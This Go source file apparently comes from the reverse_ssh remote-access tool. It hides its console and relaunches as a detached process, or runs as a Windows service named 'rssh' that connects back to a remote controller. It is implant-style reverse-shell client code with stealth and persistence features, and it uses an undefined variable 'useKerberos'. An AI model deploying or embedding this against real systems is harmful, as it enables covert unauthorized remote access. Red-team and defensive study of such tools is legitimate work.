//go:build windows

package main

import (
	"fmt"
	"log"
	"os"
	"syscall"
	"time"

	"github.com/NHAS/reverse_ssh/internal/client"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/debug"
	"golang.org/x/sys/windows/svc/eventlog"
)

var elog debug.Log

func Fork(destination, fingerprint, proxyaddress, sni string, winauth bool, pretendArgv ...string) error {

	inService, err := svc.IsWindowsService()
	if err != nil {
		elog.Error(1, fmt.Sprintf("failed to determine if we are running in service: %v", err))
		return fmt.Errorf("failed to determine if we are running in service: %v", err)
	}

	if !inService {

		modkernel32 := syscall.NewLazyDLL("kernel32.dll")
		procAttachConsole := modkernel32.NewProc("FreeConsole")
		syscall.Syscall(procAttachConsole.Addr(), 0, 0, 0, 0)

		path, err := os.Executable()
		if err != nil {
			return err
		}

		return fork(path, &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: windows.CREATE_NEW_PROCESS_GROUP | windows.DETACHED_PROCESS,
		}, pretendArgv...)
	}

	runService("rssh", destination, fingerprint, proxyaddress, sni)

	return nil
}

type rsshService struct {
	Dest, Fingerprint, Proxy, SNI string
	Winauth                       bool
}

func runService(name, destination, fingerprint, proxyaddress, sni string) {
	var err error

	elog, err := eventlog.Open(name)
	if err != nil {
		return
	}

	defer elog.Close()

	elog.Info(1, fmt.Sprintf("starting %s service", name))
	err = svc.Run(name, &rsshService{
		destination,
		fingerprint,
		proxyaddress,
		sni,
		useKerberos,
	})
	if err != nil {
		elog.Error(1, fmt.Sprintf("%s service failed: %v", name, err))
		return
	}
	elog.Info(1, fmt.Sprintf("%s service stopped", name))
}

func (m *rsshService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown
	changes <- svc.Status{State: svc.StartPending}

	go client.Run(m.Dest, m.Fingerprint, m.Proxy, m.SNI, m.Winauth)
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}

Outer:
	for c := range r {
		switch c.Cmd {
		case svc.Interrogate:
			changes <- c.CurrentStatus
			// Testing deadlock from https://code.google.com/p/winsvc/issues/detail?id=4
			time.Sleep(100 * time.Millisecond)
			changes <- c.CurrentStatus
		case svc.Stop, svc.Shutdown:
			break Outer
		default:
			elog.Error(1, fmt.Sprintf("unexpected control request #%d", c))
		}
	}

	changes <- svc.Status{State: svc.StopPending}
	changes <- svc.Status{State: svc.Stopped}

	os.Exit(0)
	return
}

func Run(destination, fingerprint, proxyaddress, sni string, winauth bool) {

	inService, err := svc.IsWindowsService()
	if err != nil {
		log.Printf("failed to determine if we are running in service: %v", err)
		client.Run(destination, fingerprint, proxyaddress, sni, winauth)
	}

	if !inService {

		client.Run(destination, fingerprint, proxyaddress, sni, winauth)
		return
	}

	runService("rssh", destination, fingerprint, proxyaddress, sni)

}
